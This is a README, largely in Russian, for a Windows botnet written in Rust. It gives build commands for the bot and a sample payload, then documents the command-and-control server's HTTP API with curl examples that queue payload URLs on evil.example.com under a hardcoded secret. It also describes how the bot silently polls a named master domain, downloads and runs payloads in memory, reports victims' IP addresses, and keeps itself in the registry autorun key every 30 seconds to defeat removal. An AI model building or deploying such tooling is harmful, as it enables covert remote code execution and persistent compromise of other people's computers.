> "botnet" is already cool enough

## Build
#### slave (манифест asInvoker через embed-manifest в `build.rs` — тихий старт, без UAC)
`cargo zigbuild --bin slave --release --target x86_64-pc-windows-gnu`
#### virus(sample payload)
`cargo zigbuild --bin virus --release --target x86_64-pc-windows-gnu`
#### cook iso for VM 
`xorriso -outdev output.iso -blank as_needed -map target/x86_64-pc-windows-gnu/release/virus.exe /virus.exe`

> оба бина для windows получают встроенный манифест с `asInvoker` (см. `build.rs`) — бот стартует молча, без UAC-диалога

## Master API (port 6767)

### `GET /poll` — забрать всю очередь вирусов
```bash
curl -s http://localhost:6767/poll
```
```json
[{"id":1,"url":"http://evil.example.com/payload.bin","status":"created","out":null}]
```

### `POST /virus_add` — новый вирус в очередь

Секрет обязателен, иначе `401`. Мастер хранит только `url` — то, что лежит по адресу, качает сам slave. Ответ: `id = id последнего + 1`, статус `created`, `out = null`.
```bash
curl -s -X POST http://localhost:6767/virus_add \
  -H "Content-Type: application/json" \
  -d '{"url": "http://evil.example.com/payload.bin", "secret": "gazan67"}'
```
```json
{"id":1,"url":"http://evil.example.com/payload.bin","status":"created","out":null}
```

Неверный секрет → `HTTP 401`:
```bash
curl -s -w "\nHTTP %{http_code}\n" -X POST http://localhost:6767/virus_add \
  -H "Content-Type: application/json" \
  -d '{"url": "http://evil.example.com/payload.bin", "secret": "wrong"}'
```

### `POST /virus_status` — отчитаться о результате

Тело: `{"id": ..., "status": ..., "out": [...]}`. `out` — `Vec<u8>`, т.е. **массив чисел** (байтов), не строка.

* `cooked` — вирус скомпилирован, `out` = результат:
```bash
curl -s -X POST http://localhost:6767/virus_status \
  -H "Content-Type: application/json" \
  -d '{"id": 1, "status": "cooked", "out": [104, 101, 108, 108, 111]}'
```
Ответ: `virus 1 is cooked`

* `fifty` — промежуточный статус:
```bash
curl -s -X POST http://localhost:6767/virus_status \
  -H "Content-Type: application/json" \
  -d '{"id": 1, "status": "fifty", "out": [1, 2, 3]}'
```
Ответ: `virus 1 is fifty`

* `accepted` — клиент принял вирус, `out` = его IP в UTF-8 байтах (мастер кладёт пару `ip -> id` в `pro`). Пример для IP `192.168.1.13`:
```bash
curl -s -X POST http://localhost:6767/virus_status \
  -H "Content-Type: application/json" \
  -d '{"id": 1, "status": "accepted", "out": [49,57,50,46,49,54,56,46,49,46,49,51]}'
```
Ответ: `virus 1 accepted`

Не считать байты IP вручную:
```bash
python3 -c 'import sys,json; ip=sys.argv[1]; print(json.dumps({"id":1,"status":"accepted","out":list(ip.encode())}))' 192.168.1.13 | \
  curl -s -X POST http://localhost:6767/virus_status -H "Content-Type: application/json" -d @-
```

Любой другой статус → `virus <id>: прислал хуйню <статус>`.

### `POST /virus_remove` — удалить вирус по id

Тот же секрет, что и у `virus_add`:
```bash
curl -s -X POST http://localhost:6767/virus_remove \
  -H "Content-Type: application/json" \
  -d '{"id": 1, "secret": "gazan67"}'
```
Ответы: `virus 1 removed` / `virus 1 not found in que`, неверный секрет → `401`.

### `GET /list` — всё состояние мастера (`que` + `pro`)
```bash
curl -s http://localhost:6767/list
```
```json
{"que":[{"id":1,"url":"http://evil.example.com/payload.bin","status":"created","out":null}],"pro":{"192.168.1.13":1}}
```

### `GET /pro` — где slave ищет себя
```bash
curl -s http://localhost:6767/pro
```

## Slave

Адрес дидди — константа `MASTER = "http://master.impostorboy.ru"` в начале `src/slave.rs`.

`/poll` ретраится при ошибке: экспоненциальный backoff 5 → 10 → 20 → ... сек (потолок — минутный интервал) до успеха, поэтому не пойманное дидди не ванну.

Жизненный цикл на каждый вирус с наименьшим не занятым `id`:
1. раз в минуту дёргает `GET /poll` и берёт оттуда вирус с наименьшим `id` со статусом `created`2. сразу шлёт `POST /virus_status` со статусом `accepted` и своим IP в `out`
3. скачивает payload с `virus.url` и шлёт `POST /virus_status` со статусом `fifty` (половина дела сделана)
4. исполняет из памяти через maple
5. **только после исполнения** идёт в `GET /pro` и ищет себя по своему IP; если мастер так и не записал `ip -> id` — перепосылаем `accepted` и проверяем ещё раз
6. в конце шлёт `POST /virus_status` со статусом `cooked` — в `out` лежит `все по плану`; после этого вирус в `que` считает себя выполненным

Всё под `tokio::spawn` — не тормозим следующий poll.

### Автозапуск (страж)

Slave каждые 30 сек **слепо перерегистрирует себя** в автозапуске крейтом `auto-launch` (`disable()` + `enable()` с свежим `current_exe()`), `autostart_watchdog` в `src/slave.rs`, первый чек — сразу при старте:

- Windows: ключ `HKCU\Software\...\Run` (`WindowsEnableMode::CurrentUser` — без админа, в духе asInvoker) + разруливание гашения через Task Manager (`StartupApproved`)
- Linux: `~/.config/autostart/*.desktop` (для тестов; slave целится в Windows)
- имя записи — `diddy slave`

Слепая перерегистрация гарантирует свежий путь в записи после переезда exe, убранные вручную/Task Manager'ом записи возвращаются через ≤30 сек.
